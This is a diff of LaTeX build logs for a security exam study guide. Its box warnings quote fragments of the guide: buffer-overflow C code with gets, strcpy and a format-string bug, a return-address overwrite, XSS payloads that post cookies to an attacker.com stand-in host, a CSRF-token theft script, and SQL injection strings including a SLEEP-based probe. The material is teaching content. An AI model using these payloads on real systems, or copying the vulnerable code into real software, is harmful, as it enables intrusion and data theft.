-\OT1/cmr/m/n/12 Give a value of \OT1/cmtt/m/n/12 plen \OT1/cmr/m/n/12 and an in
--put to \OT1/cmtt/m/n/12 enroll \OT1/cmr/m/n/12 that makes the dae-mon ex-e-cut
-e \OT1/cmtt/m/n/12 spawn[]console\OT1/cmr/m/n/12 ,
+Underfull \hbox (badness 10000) in paragraph at lines 881--892
+\OT1/cmtt/m/n/10.95 memcpy(cmd, packet, plen); /* Line C */ exec[]cmd(cmd); /* 
+Line D:
  []
 
-[25]
-Overfull \hbox (44.93445pt too wide) in paragraph at lines 365--366
-\OT1/cmr/m/n/12 (\OT1/cmtt/m/n/12 A$\OMS/cmtt/m/n/12 ^^B\OT1/cmr/m/n/12 16$) fo
+[32] [33]
+Overfull \hbox (44.93445pt too wide) in paragraph at lines 926--927
+\OT1/cmr/m/n/12 (\OT1/cmtt/m/n/12 A$\OMS/cmsy/m/n/12 ^^B\OT1/cmr/m/n/12 16$) fo
 l-lowed by the 8-byte little-endian en-cod-ing of \OT1/cmtt/m/n/12 0x4011c8\OT1
-/cmr/m/n/12 , i.e. $[] [] [] [] [] [] [] []$.
+/cmr/m/n/12 , i.e. $[] [] [] [] [] [] [] []$. 
  []
 
-[26]
-Overfull \hbox (17.5812pt too wide) in paragraph at lines 368--369
+[34]
+Overfull \hbox (17.5812pt too wide) in paragraph at lines 939--941
 \OT1/cmr/m/n/12 copy: \OT1/cmtt/m/n/12 if (plen > sizeof s->user) return; \OT1/
 cmr/m/n/12 be-fore Line A and \OT1/cmtt/m/n/12 if (plen > sizeof
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 374--375
-\OT1/cmtt/m/n/12 result = 0; gets(input); if (strcmp(input, pwd) == 0) result =
- 1;
+Underfull \hbox (badness 10000) in paragraph at lines 949--958
+[]\OT1/cmtt/m/n/10.95 int check[]pwd(char *pwd) \OMS/cmtt/m/n/10.95 f \OT1/cmtt
+/m/n/10.95 int result; char input[10]; result =
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 374--375
-\OT1/cmtt/m/n/12 return result; \OMS/cmtt/m/n/12 g \OT1/cmtt/m/n/12 void main()
- \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 int auth = check[]pwd(``12345''); if
- []
-
-[27] [28]
-Underfull \hbox (badness 2073) in paragraph at lines 388--389
-[]\OT1/cmr/bx/n/12 Problem: \OT1/cmr/m/n/12 The fol-low-ing pro-gram is not mem
--ory safe; \OT1/cmtt/m/n/12 input \OT1/cmr/m/n/12 and \OT1/cmtt/m/n/12 len
+Underfull \hbox (badness 10000) in paragraph at lines 949--958
+\OT1/cmtt/m/n/10.95 0; gets(input); if (strcmp(input, pwd) == 0) result = 1; re
+turn
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 388--389
-\OT1/cmr/m/n/12 are con-trolled by an at-tacker. \OT1/cmtt/m/n/12 void process(
-char *input, size[]t
+Underfull \hbox (badness 10000) in paragraph at lines 949--958
+\OT1/cmtt/m/n/10.95 result; \OMS/cmtt/m/n/10.95 g \OT1/cmtt/m/n/10.95 void main
+() \OMS/cmtt/m/n/10.95 f \OT1/cmtt/m/n/10.95 int auth = check[]pwd(``12345''); 
+if (auth)
+ []
+
+[35] [36]
+Underfull \hbox (badness 10000) in paragraph at lines 997--1006
+[]\OT1/cmtt/m/n/10.95 void process(char *input, size[]t len) \OMS/cmtt/m/n/10.9
+5 f \OT1/cmtt/m/n/10.95 char buffer[32]; char *tmp
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 388--389
-\OT1/cmtt/m/n/12 len) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char buffer[32]; char
- *tmp = malloc(32); if (tmp == NULL)
+Underfull \hbox (badness 10000) in paragraph at lines 997--1006
+\OT1/cmtt/m/n/10.95 = malloc(32); if (tmp == NULL) return; memcpy(tmp, input, l
+en);
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 388--389
-\OT1/cmtt/m/n/12 return; memcpy(tmp, input, len); // Line A free(tmp); // Line 
-B
+Underfull \hbox (badness 10000) in paragraph at lines 997--1006
+\OT1/cmtt/m/n/10.95 // Line A free(tmp); // Line B strcat(buffer, input); // Li
+ne C
+ []
+
+[37] [38]
+Underfull \hbox (badness 10000) in paragraph at lines 1048--1057
+[]\OT1/cmtt/m/n/10.95 void printInput(char *input) \OMS/cmtt/m/n/10.95 f \OT1/c
+mtt/m/n/10.95 char buffer[50]; char secret[20]
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 388--389
-\OT1/cmtt/m/n/12 strcat(buffer, input); // Line C printf(``%s\OMS/cmtt/m/n/12 n
-\OT1/cmtt/m/n/12 n'', buffer); // Line D
- []
-
-[29]
-Underfull \hbox (badness 10000) in paragraph at lines 402--403
-\OT1/cmtt/m/n/12 *input) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char buffer[50]; c
-har secret[20] = ``Pwd123456''; if
+Underfull \hbox (badness 10000) in paragraph at lines 1048--1057
+\OT1/cmtt/m/n/10.95 = ``Pwd123456''; if (strcmp(input, secret) == 0) print(secr
+et);
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 402--403
-\OT1/cmtt/m/n/12 (strcmp(input, secret) == 0) print(secret); else printf(input)
-;
+Underfull \hbox (badness 10000) in paragraph at lines 1048--1057
+\OT1/cmtt/m/n/10.95 else printf(input); strcpy(buffer, input); \OMS/cmtt/m/n/10
+.95 g \OT1/cmtt/m/n/10.95 int main(int argc,
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 402--403
-\OT1/cmtt/m/n/12 strcpy(buffer, input); \OMS/cmtt/m/n/12 g \OT1/cmtt/m/n/12 int
- main(int argc, char *argv[]) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 if (argc
+Underfull \hbox (badness 10000) in paragraph at lines 1048--1057
+\OT1/cmtt/m/n/10.95 char *argv[]) \OMS/cmtt/m/n/10.95 f \OT1/cmtt/m/n/10.95 if 
+(argc != 2) return 1; printInput(argv[1]);
  []
 
-[30]
-Overfull \hbox (31.12555pt too wide) in paragraph at lines 416--417
+[39] [40]
+Overfull \hbox (13.50073pt too wide) in paragraph at lines 1092--1093
 []\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
 2 re-exam-problems-with-sample-solutions.pdf::6c 
  []
 
-LaTeX Font Info:    Trying to load font information for OMS+cmr on input line 4
-21.
+LaTeX Font Info:    Trying to load font information for OMS+cmr on input line 1
+102.
 (/usr/local/texlive/2025/texmf-dist/tex/latex/base/omscmr.fd
 File: omscmr.fd 2024/11/19 v2.5n Standard LaTeX font definitions
 )
 LaTeX Font Info:    Font shape `OMS/cmr/m/n' in size <12> not available
-(Font)              Font shape `OMS/cmsy/m/n' tried instead on input line 421.
- [31] [32]
-[33] [34] [35] [36] [37] [38]
-Overfull \hbox (41.56989pt too wide) in paragraph at lines 529--530
+(Font)              Font shape `OMS/cmsy/m/n' tried instead on input line 1102.
+
+ [41] [42]
+[43] [44] [45] [46] [47]
+
+Package tcolorbox Warning: Using nobreak failed. Try to enlarge `lines before b
+reak' or set page breaks manually on input line 1264.
+
+[48] [49] [50]
+Overfull \hbox (23.94507pt too wide) in paragraph at lines 1321--1322
 []\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
 2 re-exam-problems-with-sample-solutions.pdf::2b.1 
  []
 
-[39] [40] [41] [42]
-Overfull \hbox (90.83691pt too wide) in paragraph at lines 599--600
-\OT1/cmr/m/n/12 shared key $\OML/cmm/m/it/12 K$\OT1/cmr/m/n/12 . The pro-to-col
-: Step 1: $\OML/cmm/m/it/12 Dev \OMS/cmsy/m/n/12 ! \OML/cmm/m/it/12 Dist \OT1/c
-mr/m/n/12 : \OML/cmm/m/it/12 FwID; Version; Firmware; Sig[]\OT1/cmr/m/n/12 (\OM
-L/cmm/m/it/12 FwID; Version\OT1/cmr/m/n/12 )$.
+[51] [52] [53]
+Overfull \hbox (61.19522pt too wide) in paragraph at lines 1371--1373
+\OT1/cmr/m/n/12 Diffie--Hellman key ex-change), with ex-plicit mes-sage for-mu-
+las such as $\OML/cmm/m/it/12 M \OT1/cmr/m/n/12 = (\OML/cmm/m/it/12 PayGate; Al
+ice; Amount\OT1/cmr/m/n/12 )$
  []
 
 
-Overfull \hbox (1.21463pt too wide) in paragraph at lines 599--600
-\OML/cmm/m/it/12 Cam \OT1/cmr/m/n/12 : \OML/cmm/m/it/12 FwID; Version; Firmware
-; MAC[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 FwID; Version; Hash\OT1/cmr/m/n/12 (\O
-ML/cmm/m/it/12 Firmware\OT1/cmr/m/n/12 ))$. Step
+Underfull \hbox (badness 1152) in paragraph at lines 1399--1401
+[]\OT1/cmr/bx/n/12 Map mes-sages and goals: \OT1/cmr/m/n/12 Tab-u-late ev-ery m
+es-sage $\OML/cmm/m/it/12 A \OMS/cmsy/m/n/12 ! \OML/cmm/m/it/12 B \OT1/cmr/m/n/
+12 :
  []
 
-[43]
-Overfull \hbox (20.8581pt too wide) in paragraph at lines 603--604
+[54] [55] [56]
+Underfull \hbox (badness 10000) in paragraph at lines 1452--1456
+[]\OT1/cmr/m/n/12 The pro-to-col: Step 1: $\OML/cmm/m/it/12 Dev \OMS/cmsy/m/n/1
+2 ! \OML/cmm/m/it/12 Dist \OT1/cmr/m/n/12 :
+ []
+
+
+Underfull \hbox (badness 2351) in paragraph at lines 1452--1456
+\OML/cmm/m/it/12 FwID; Version; Firmware; Sig[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/1
+2 FwID; Version\OT1/cmr/m/n/12 )$. Step 2: Dist ver-i-fies
+ []
+
+[57]
+Overfull \hbox (20.8581pt too wide) in paragraph at lines 1469--1472
 []\OT1/cmr/m/it/12 Applying Step 1 (map): \OT1/cmr/m/n/12 Map be-fore judg-ing.
  Leg 1 (Dev $\OMS/cmsy/m/n/12 !$ \OT1/cmr/m/n/12 Dist) puts $(\OML/cmm/m/it/12 
 FwID; Version\OT1/cmr/m/n/12 )$
  []
 
 
-Overfull \hbox (32.1097pt too wide) in paragraph at lines 605--606
-\OML/cmm/m/it/12 Dev \OMS/cmsy/m/n/12 ! \OML/cmm/m/it/12 Dist \OT1/cmr/m/n/12 :
- \OML/cmm/m/it/12 FwID; Version; Firmware; Sig[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/
-12 FwID; Version; Hash\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 Firmware\OT1/cmr/m/n/12
- ))$,
- []
-
-[44] [45]
-Underfull \hbox (badness 10000) in paragraph at lines 631--632
-[]\OT1/cmr/m/it/12 Applying Step 1 (map): \OT1/cmr/m/n/12 Five mes-sages. The o
-nly cryp-to-
+Overfull \hbox (3.31334pt too wide) in paragraph at lines 1479--1482
+\OML/cmm/m/it/12 Firmware[]$\OT1/cmr/m/n/12 , and for-wards $(\OML/cmm/m/it/12 
+FwID; Version; Firmware[]; Sig[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 FwID; Version
+\OT1/cmr/m/n/12 ))$.
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 631--632
-\OT1/cmr/m/n/12 graphic pro-tec-tion Bob re-lies on is the Server's signed proo
-f
+Overfull \hbox (134.77762pt too wide) in paragraph at lines 1479--1482
+\OT1/cmr/m/n/12 tack: pos-si-ble. Fix: $\OML/cmm/m/it/12 Dev \OMS/cmsy/m/n/12 !
+ \OML/cmm/m/it/12 Dist \OT1/cmr/m/n/12 : \OML/cmm/m/it/12 FwID; Version; Firmwa
+re; Sig[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 FwID; Version; Hash\OT1/cmr/m/n/12 (
+\OML/cmm/m/it/12 Firmware\OT1/cmr/m/n/12 ))$,
  []
 
-[46] [47] [48] [49] [50] [51] [52] [53] [54] [55] [56] [57] [58] [59] [60]
-[61] [62] [63] [64] [65]
-Overfull \hbox (31.12555pt too wide) in paragraph at lines 882--883
+[58] [59] [60] [61] [62]
+Overfull \hbox (92.13795pt too wide) in paragraph at lines 1582--1583
+[]\OT1/cmr/m/n/12 The match-ing threat names are \OT1/cmr/bx/it/12 dis-clo-sure
+ \OT1/cmr/m/n/12 (against con-fi-den-tial-ity), \OT1/cmr/bx/it/12 de-cep-tion\O
+T1/cmr/m/n/12 /\OT1/cmr/bx/it/12 disruption\OT1/cmr/m/n/12 /\OT1/cmr/bx/it/12 u
+surpation
+ []
+
+[63] [64]
+Overfull \hbox (3.1418pt too wide) in paragraph at lines 1626--1630
+[]\OT1/cmr/bx/it/12 Side chan-nels \OT1/cmr/m/n/12 are \OT1/cmr/m/it/12 pas-siv
+e, non-invasive \OT1/cmr/m/n/12 ob-ser-va-tions of byprod-ucts (time, cache, po
+wer);
+ []
+
+[65] [66] [67] [68] [69] [70] [71] [72] [73] [74] [75] [76] [77]
+Underfull \hbox (badness 1221) in paragraph at lines 1942--1944
+\OT1/cmr/bx/n/12 IV reuse): \OT1/cmr/m/n/12 The re-exam `novel mode' (re-exam-p
+roblems-with-sample-
+ []
+
+[78] [79] [80] [81] [82] [83] [84]
+Underfull \hbox (badness 1946) in paragraph at lines 2137--2138
+[]\OT1/cmr/m/n/12 A mes-sage $\OML/cmm/m/it/12 P \OT1/cmr/m/n/12 = (\OML/cmm/m/
+it/12 P[]; [] ; P[]\OT1/cmr/m/n/12 )$ of blocks of size $\OML/cmm/m/it/12 n$ \O
+T1/cmr/m/n/12 is en-crypted with
+ []
+
+
+Underfull \hbox (badness 1052) in paragraph at lines 2137--2138
+\OT1/cmr/m/n/12 two in-de-pen-dent, ran-domly gen-er-ated ini-tial-iza-tion vec
+-tors $\OML/cmm/m/it/12 IV[]; IV[]$\OT1/cmr/m/n/12 , and
+ []
+
+
+Underfull \hbox (badness 1215) in paragraph at lines 2167--2169
+[]\OT1/cmr/m/it/12 Applying Step 5: Trace the flip in $\OML/cmm/m/it/12 C[]$ \O
+T1/cmr/m/it/12 block by block: \OT1/cmr/m/n/12 Bob de-crypts
+ []
+
+[85] [86]
+Overfull \hbox (13.50073pt too wide) in paragraph at lines 2183--2184
 []\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
 2 re-exam-problems-with-sample-solutions.pdf::8c 
  []
 
 
-Overfull \hbox (24.2155pt too wide) in paragraph at lines 889--889
+Overfull \hbox (27.7405pt too wide) in paragraph at lines 2204--2205
 []\OT1/cmr/m/n/12 A script fetched from an-other ori-gin (e.g. \OT1/cmtt/m/n/12
  <script src="https://attacker.com/x.js">\OT1/cmr/m/n/12 )
  []
 
-[66]
-Overfull \hbox (178.48552pt too wide) in paragraph at lines 893--893
-\OT1/cmr/m/n/12 (SOP), but the side ef-fect has al-ready hap-pened. Trap: a \OT
-1/cmtt/m/n/12 <script src="fakebook.com/resetPassword?password=42">
+[87]
+Overfull \hbox (19.30782pt too wide) in paragraph at lines 2225--2226
+[]\OT1/cmr/bx/it/12 Reflected XSS\OT1/cmr/m/n/12 : the pay-load is echoed back 
+from a re-quest pa-ram-e-ter, e.g. \OT1/cmtt/m/n/12 /home?msg=X\OT1/cmr/m/n/12 
+. 
  []
 
-
-Overfull \hbox (17.99542pt too wide) in paragraph at lines 893--893
+[88]
+Overfull \hbox (21.52042pt too wide) in paragraph at lines 2231--2233
 \OT1/cmr/m/n/12 query the server builds by string con-cate-na-tion, e.g. \OT1/c
 mtt/m/n/12 "SELECT ... WHERE customerName
  []
 
-[67]
-Underfull \hbox (badness 10000) in paragraph at lines 915--915
+[89] [90]
+Underfull \hbox (badness 10000) in paragraph at lines 2307--2308
 []\OT1/cmr/bx/it/12 XSS ex-fil-tra-tion \OT1/cmr/m/n/12 (needs HttpOnly=false):
 
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 915--915
+Underfull \hbox (badness 10000) in paragraph at lines 2307--2308
 \OT1/cmtt/m/n/12 <script>post("https://attacker.com",
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 915--915
+Underfull \hbox (badness 10000) in paragraph at lines 2308--2309
 []\OT1/cmr/bx/it/12 XSS action-forging\OT1/cmr/m/n/12 : read any needed se-
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 915--915
+Underfull \hbox (badness 10000) in paragraph at lines 2308--2309
 \OT1/cmr/m/n/12 cret from the page, then POST: \OT1/cmtt/m/n/12 <script>var
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 915--915
+Underfull \hbox (badness 10000) in paragraph at lines 2308--2309
 \OT1/cmtt/m/n/12 t=document.getElementsByName("csrf")[0].value;
  []
 
 
-Overfull \hbox (8.80824pt too wide) in paragraph at lines 915--915
+Overfull \hbox (5.57106pt too wide) in paragraph at lines 2308--2309
 \OT1/cmtt/m/n/12 post("/transfer", "to=mallory,amount=200,csrf="+t)</script>\OT
 1/cmr/m/n/12 . 
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 915--915
+Underfull \hbox (badness 10000) in paragraph at lines 2310--2311
 []\OT1/cmr/bx/it/12 SQLi\OT1/cmr/m/n/12 : \OT1/cmtt/m/n/12 ' OR 1=1 --  \OT1/cm
 r/m/n/12 to dump all rows; \OT1/cmtt/m/n/12 x' AND
  []
 
 
-Underfull \hbox (badness 7186) in paragraph at lines 915--915
+Underfull \hbox (badness 10000) in paragraph at lines 2310--2311
 \OT1/cmtt/m/n/12 customerName='Bob' --  \OT1/cmr/m/n/12 for boolean in-fer-ence
 ; ap-pend \OT1/cmtt/m/n/12 AND
  []
 
-[68] [69]
-Underfull \hbox (badness 1168) in paragraph at lines 925--926
+[91] [92]
+Underfull \hbox (badness 1803) in paragraph at lines 2340--2342
 []\OT1/cmr/bx/n/12 Variation 2 (CSRF dis-guised as XSS): \OT1/cmr/m/n/12 A pay-
 load like \OT1/cmtt/m/n/12 <script
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 925--926
+Underfull \hbox (badness 10000) in paragraph at lines 2340--2342
 \OT1/cmtt/m/n/12 src="https://fakebook.com/resetPassword?password=42"></script>
 
  []
 
-[70] [71]
-Overfull \hbox (305.05716pt too wide) detected at line 939
+[93] [94]
+Overfull \hbox (305.05716pt too wide) detected at line 2382
 []
  []
 
-
-Overfull \hbox (53.81824pt too wide) in paragraph at lines 943--944
+[95]
+Overfull \hbox (53.81824pt too wide) in paragraph at lines 2396--2400
 \OT1/cmr/m/n/12 an-swer: the stored ti-tle \OT1/cmtt/m/n/12 <script>var t=docum
 ent.getElementsByName("csrf")[0].value;
  []
 
 
-Overfull \hbox (7.57573pt too wide) in paragraph at lines 943--944
+Overfull \hbox (7.57573pt too wide) in paragraph at lines 2396--2400
 \OT1/cmtt/m/n/12 post("/transfer", "to=mallory,amount=200,csrf="+t)</script>\OT
 1/cmr/m/n/12 , de-liv-ered by
  []
 
-[72]
-Overfull \hbox (205.06302pt too wide) in paragraph at lines 956--956
+
+Overfull \hbox (201.82584pt too wide) in paragraph at lines 2426--2427
 \OT1/cmr/m/n/12 Al-bin loads \OT1/cmtt/m/n/12 www.readbooks.com/home?msg=<scrip
 t>post("www.attacker.com",document.cookie)</script>\OT1/cmr/m/n/12 ;
  []
 
 
-Overfull \hbox (106.40079pt too wide) in paragraph at lines 959--960
-\OT1/cmr/bx/n/12 Answer: \OT1/cmr/m/n/12 Events: 3, None; then 2, \OT1/cmtt/m/n
-/12 <script>post("www.attacker.com",document.cookie)</script>
+Overfull \hbox (70.94167pt too wide) in paragraph at lines 2434--2435
+[]\OT1/cmr/m/n/12 Events: 3, None; then 2, \OT1/cmtt/m/n/12 <script>post("www.a
+ttacker.com",document.cookie)</script>
  []
 
-[73]
-Underfull \hbox (badness 2662) in paragraph at lines 963--964
-\OT1/cmr/m/n/12 ac-counts. Mal-lory makes a Fake-Book post with the con-tents \
-OT1/cmtt/m/n/12 <script
+[96]
+
+Package tcolorbox Warning: Using nobreak failed. Try to enlarge `lines before b
+reak' or set page breaks manually on input line 2436.
+
+[97]
+Underfull \hbox (badness 2735) in paragraph at lines 2440--2441
+\OT1/cmr/m/n/12 are stored on Fake-Book servers. Al-ice and Mal-lory both have 
+ac-
  []
 
-[74]
-Overfull \hbox (236.70981pt too wide) detected at line 986
+
+Underfull \hbox (badness 2005) in paragraph at lines 2440--2441
+\OT1/cmr/m/n/12 counts. Mal-lory makes a Fake-Book post with the con-tents \OT1
+/cmtt/m/n/12 <script
+ []
+
+[98]
+Underfull \hbox (badness 2529) in paragraph at lines 2473--2474
+[]\OT1/cmr/m/n/12 Kungliga Op-eran's ticket sys-tem uses a ta-ble \OT1/cmtt/m/n
+/12 tickets(customerName,
+ []
+
+
+Underfull \hbox (badness 6825) in paragraph at lines 2475--2478
+[]\OT1/cmr/m/n/12 A page takes an opera name as in-put, runs the query \OT1/cmt
+t/m/n/12 SELECT
+ []
+
+
+Overfull \hbox (229.94763pt too wide) detected at line 2499
 []
  []
 
-[75]
-Overfull \hbox (32.43109pt too wide) in paragraph at lines 993--994
+
+Underfull \hbox (badness 8132) in paragraph at lines 2512--2513
+[]\OT1/cmr/m/n/12 Input \OT1/cmtt/m/n/12 Carmen' AND customerName = 'Bob' AND S
+LEEP(10) = 1 -- \OT1/cmr/m/n/12 : a
+ []
+
+[99] [100]
+Overfull \hbox (14.80627pt too wide) in paragraph at lines 2516--2517
 []\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
 2 re-exam-problems-with-sample-solutions.pdf::3b 
  []
 
 
-Overfull \hbox (39.5538pt too wide) in paragraph at lines 995--995
-[]\OT1/cmr/bx/n/17.28 Question Type 9: Pass-word stor-age and authentication-
+Overfull \hbox (35.66586pt too wide) in paragraph at lines 2518--2518
+|[]\OT1/cmr/bx/n/17.28 Question Type 9: Pass-word stor-age and authentication-
  []
 
-[76] [77] [78] [79] [80]
-Underfull \hbox (badness 1297) in paragraph at lines 1040--1041
-\OT1/cmr/m/n/12 the scheme sends $\OML/cmm/m/it/12 H[]\OT1/cmr/m/n/12 (\OML/cmm
-/m/it/12 pwd \OMS/cmsy/m/n/12 k \OML/cmm/m/it/12 salt\OT1/cmr/m/n/12 )$ at lo-g
-in $\OML/cmm/m/it/12 i$ \OT1/cmr/m/n/12 and the server ver-i-fies
+[101] [102] [103] [104]
+Overfull \hbox (75.594pt too wide) in paragraph at lines 2596--2599
+\OT1/cmr/m/n/12 hash $\OML/cmm/m/it/12 H$ \OT1/cmr/m/n/12 and con-cate-na-tion 
+(e.g. $\OML/cmm/m/it/12 H\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 password\OT1/cmr/m/n
+/12 )$, $\OML/cmm/m/it/12 H\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 username \OMS/cmsy
+/m/n/12 k \OML/cmm/m/it/12 password\OT1/cmr/m/n/12 )$, $\OML/cmm/m/it/12 H\OT1/
+cmr/m/n/12 (\OML/cmm/m/it/12 H\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 username\OT1/cm
+r/m/n/12 ) \OMS/cmsy/m/n/12 k \OML/cmm/m/it/12 password\OT1/cmr/m/n/12 )$,
  []
 
-[81] [82]
-Overfull \hbox (23.10991pt too wide) in paragraph at lines 1061--1061
+[105] [106] [107] [108] [109] [110]
+Overfull \hbox (23.10991pt too wide) in paragraph at lines 2748--2749
 \OT1/cmr/m/n/12 into all $\OML/cmm/m/it/12 U$ \OT1/cmr/m/n/12 en-tries: $1$ has
 h (writes are free). (b) Per user com-pute $\OML/cmm/m/it/12 H\OT1/cmr/m/n/12 (
 \OML/cmm/m/it/12 letmein \OMS/cmsy/m/n/12 k \OML/cmm/m/it/12 username\OT1/cmr/m
 /n/12 )$:
  []
 
-[83] [84] [85]
-Underfull \hbox (badness 1014) in paragraph at lines 1089--1089
+[111] [112] [113] [114]
+Underfull \hbox (badness 2119) in paragraph at lines 2860--2860
 []\OT1/cmr/bx/n/12 Exam Prac-tice: Reg-u-lar exam (exam-problems-with-solutions
 .pdf),
  []
 
-[86] [87] [88]
-Overfull \hbox (9.28412pt too wide) in paragraph at lines 1123--1124
-[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
-2 dasak18combinedWithSolutions-1.pdf::Part
+[115] [116] [117] [118] [119] [120] [121] [122]
+Overfull \hbox (4.63055pt too wide) in paragraph at lines 2988--2992
+[]\OT1/cmr/bx/n/12 Givens / Prob-lem sig-na-ture: \OT1/cmr/m/n/12 A request--re
+sponse or publish--subscribe ser-vice/protocol
  []
 
-[89] [90] [91]
-Underfull \hbox (badness 2529) in paragraph at lines 1161--1161
-[]\OT1/cmr/m/n/12 spoofing is fixed at the source by the \OT1/cmr/bx/it/12 at-t
-acker's ISP \OT1/cmr/m/n/12 via
+
+Underfull \hbox (badness 1127) in paragraph at lines 3018--3019
+[]\OT1/cmr/m/n/12 transport: UDP/ICMP $\OMS/cmsy/m/n/12 !$ \OT1/cmr/bx/it/12 so
+urce IP is forge-able\OT1/cmr/m/n/12 ; TCP $\OMS/cmsy/m/n/12 !$
  []
 
-[92] [93] [94] [95] [96] [97]
-Overfull \hbox (31.77832pt too wide) in paragraph at lines 1230--1231
+[123] [124] [125] [126] [127]
+
+Package tcolorbox Warning: Using nobreak failed. Try to enlarge `lines before b
+reak' or set page breaks manually on input line 3109.
+
+[128] [129] [130] [131]
+Overfull \hbox (14.1535pt too wide) in paragraph at lines 3162--3163
 []\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
 2 re-exam-problems-with-sample-solutions.pdf::5a 
  []
 
-[98] [99] [100] [101] [102] [103] [104]
-Underfull \hbox (badness 2564) in paragraph at lines 1339--1340
-[]\OT1/cmr/m/it/12 Applying Step 5 (har-vest, part b): \OT1/cmr/m/n/12 Sam-ple 
-so-lu-tion: the at-tacker
+
+Overfull \hbox (14.2598pt too wide) in paragraph at lines 3164--3164
+|[]\OT1/cmr/bx/n/17.28 Question Type 11: Social-engineering sce-nario anal-
  []
 
-[105] [106]
-Overfull \hbox (5.48317pt too wide) in paragraph at lines 1351--1352
+[132] [133] [134] [135] [136] [137] [138] [139]
+
+Package tcolorbox Warning: Using nobreak failed. Try to enlarge `lines before b
+reak' or set page breaks manually on input line 3345.
+
+[140]
+Underfull \hbox (badness 1231) in paragraph at lines 3368--3369
+[]\OT1/cmr/m/it/12 Applying Step 2 (strate-gies): \OT1/cmr/m/n/12 Of-fi-cial sa
+m-ple an-swers (any three): 1)
+ []
+
+
+Underfull \hbox (badness 1466) in paragraph at lines 3379--3380
+\OT1/cmr/m/n/12 sure/conformity (`the Er-ic-ssons and the Smiths al-ready do-na
+ted'), rap-
+ []
+
+[141] [142] [143]
+Overfull \hbox (5.48317pt too wide) in paragraph at lines 3388--3389
 []\OT1/cmr/bx/n/12 Question Type 2 (Cache/timing side-channel at-tack anal-y-si
 s and constant-
  []
 
-[107]
-Overfull \hbox (32.79422pt too wide) in paragraph at lines 1359--1360
+
+Overfull \hbox (32.79422pt too wide) in paragraph at lines 3396--3397
 []\OT1/cmr/bx/n/12 Question Type 10 (DoS at-tack con-struc-tion and coun-ter-me
 a-sure/responsibility
  []
 
-[108] (./study_guide.aux)
+[144] (./study_guide.aux)
  ***********
 LaTeX2e <2025-11-01>
 L3 programming layer <2026-01-19>
@@ -1099,13 +1230,13 @@ LaTeX Font Warning: Some font shapes were not available, defaults substituted.
 
  ) 
 Here is how much of TeX's memory you used:
- 18580 strings out of 467533
- 393904 string characters out of 5419495
- 824110 words of memory out of 5000000
- 47185 multiletter control sequences out of 15000+600000
- 638810 words of font info for 83 fonts, out of 8000000 for 9000
+ 19287 strings out of 467533
+ 405644 string characters out of 5419495
+ 840584 words of memory out of 5000000
+ 47872 multiletter control sequences out of 15000+600000
+ 639235 words of font info for 85 fonts, out of 8000000 for 9000
  1141 hyphenation exceptions out of 8191
- 116i,8n,121p,2399b,1021s stack positions out of 10000i,1000n,20000p,200000b,200000s
+ 116i,8n,121p,1393b,1510s stack positions out of 10000i,1000n,20000p,200000b,200000s
 </usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmbx12.pfb
 ></usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmbxti10.pf
 b></usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmex10.pfb
@@ -1119,13 +1250,14 @@ cal/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmr8.pfb></usr/local
 /texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy10.pfb></usr/local/
 texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy8.pfb></usr/local/te
 xlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmti12.pfb></usr/local/tex
-live/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmtt12.pfb></usr/local/texl
-ive/2025/texmf-dist/fonts/type1/public/cm-super/sfrm1200.pfb></usr/local/texliv
-e/2025/texmf-dist/fonts/type1/public/cm-super/sftt1200.pfb>
-Output written on study_guide.pdf (108 pages, 637010 bytes).
+live/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmtt10.pfb></usr/local/texl
+ive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmtt12.pfb></usr/local/texli
+ve/2025/texmf-dist/fonts/type1/public/cm-super/sfrm1200.pfb></usr/local/texlive
+/2025/texmf-dist/fonts/type1/public/cm-super/sftt1200.pfb>
+Output written on study_guide.pdf (144 pages, 687474 bytes).
 PDF statistics:
- 436 PDF objects out of 1000 (max. 8388607)
- 291 compressed objects within 3 object streams
